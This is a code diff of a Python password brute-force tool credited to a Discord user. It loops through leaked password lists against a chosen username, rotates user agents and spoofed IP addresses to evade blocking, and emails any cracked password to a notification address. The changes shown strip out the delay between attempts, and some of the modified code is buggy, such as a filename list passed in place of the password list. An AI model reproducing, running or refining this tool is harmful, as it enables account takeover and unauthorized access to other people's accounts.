@@ -9,7 +9,6 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 import sys
 import os
-import signal
 
 init(autoreset=True)
 
@@ -43,6 +42,7 @@ ascii_art = """
  | |  | | \ \  | (_) | | |_) | | | | (_) |  >  <    |  __/ | (_| | | | | |_  | | | (_) | | | | |  | |                               
  | |  |_|  \_\  \___/  |_.__/  |_|  \___/  /_/\_\    \___|  \__,_| |_|  \__| |_|  \___/  |_| |_|  | |                               
   \_\                                                                                            /_/                                
+                                                                                                                                    
                                                                                                                                     
 Made by iNukedyou on Discord!
 Version 1: v1
@@ -148,84 +148,42 @@ def print_box(title, content, stats=None, response_code=None, response_header=No
     if stats:
         sys.stdout.write(f"{Fore.YELLOW}{stats}\n")
     if response_code:
-        sys.stdout.write(f"Response Code: {response_code}\n")
+        sys.stdout.write(f"{Fore.MAGENTA}Status Code: {response_code}\n")
     if response_header:
-        sys.stdout.write(f"Response Header: {response_header}\n")
+        sys.stdout.write(f"{Fore.YELLOW}Response Header: {response_header}\n")
     sys.stdout.write(f"{Fore.CYAN}==========================================\n")
 
-def prompt_user_for_username():
-    print(Fore.YELLOW + "Enter the username (Email or Phone Number):")
-    return input(Fore.CYAN + "Username: ")
-
-def prompt_user_for_email_updates():
-    print(Fore.YELLOW + "Enter the email address to receive notifications:")
-    return input(Fore.CYAN + "Email Address: ")
-
-def check_delay_customization():
-    while True:
-        print(Fore.YELLOW + "Choose an option:")
-        print(Fore.GREEN + "1. Use system-defined delay")
-        print(Fore.RED + "2. Define custom delay per attempt")
-        choice = input(Fore.CYAN + "Enter your choice (1/2): ")
-        if choice == '2':
-            delay = float(input(Fore.CYAN + "Enter delay in seconds (between 1-5): "))
-            if delay < 1 or delay > 5:
-                print(Fore.RED + "Invalid input. Using system defined delay.")
-                return True
-            elif delay >= 5:
-                print(Fore.RED + "Are you sure you want to go this fast? The server may rate-limit requests.")
-                confirmation = input("1. Yes  2. No: ")
-                if confirmation == '1':
-                    return False
-                else:
-                    return True
-            else:
-                return False
-    return True
-
-def signal_handler(sig, frame):
-    print("\n[INFO] Process interrupted. Exiting safely...")
-    sys.exit(0)
-
-signal.signal(signal.SIGINT, signal_handler)
-
-def brute_force():
-    username = prompt_user_for_username()
-    email_updates = prompt_user_for_email_updates()
-    
-    total_attempts = 0
-    start_time = time.time()
+def main():
+    print(Fore.CYAN + ascii_art)
     print_loading_screen()
 
-    print_box("PASSWORD GUESS", "")
-    print_box("LOGGING", "")
+    username = input("Enter username or email/phone number: ")
+    receiver_email = input("Enter email to receive notifications: ")
 
-    passwords = read_passwords('fortinet-2021_passwords.txt')
-    if not passwords:
-        print("[ERROR] No passwords found in fortinet-2021_passwords.txt")
-        return
+    passwords = read_passwords('darkweb2017-top10000.txt')  # Change file if needed
+    total_attempts = 0
+    start_time = time.time()
 
     for password in passwords:
-        total_attempts += 1
         user_agent = random.choice(user_agents)
         ip_address = random.choice(ip_addresses)
+        
+        print_box(f"Attempting {username} with {password}", "", f"Attempt #{total_attempts + 1}")
 
         response = attempt_login(username, password, user_agent, ip_address)
 
         if response and response.status_code == 200:
-            success = f"Success: Username: {username}, Password: {password}"
-            print(Fore.GREEN + f"[SUCCESS] {success}")
-            send_email(success, username, password, email_updates)
-            log_attempt(username, password, success)
-            return
+            print_box("Success!", f"Guessed password: {password}", "Login Successful", response.status_code, response.headers)
+            send_email(True, username, password, receiver_email)
+            break
+        else:
+            print_box("Failed", f"Guessed password: {password}", "Login Failed", response.status_code, response.headers)
+        
+        total_attempts += 1
+        log_attempt(username, password, success=False)
 
-        if total_attempts % 10 == 0:
-            track_passwords_per_minute(start_time, total_attempts)
-            estimate_time_left(total_attempts, passwords, start_time)
+        track_passwords_per_minute(start_time, total_attempts)
+        estimate_time_left(total_attempts, ['darkweb2017-top10000.txt'], start_time)
 
-        time.sleep(random.uniform(1, 3))
-
-    print(Fore.RED + "[ERROR] Failed to find password after attempting all passwords.")
-    log_attempt(username, "", "Failed", total_attempts)
-
-brute_force()
+if __name__ == "__main__":
+    main()
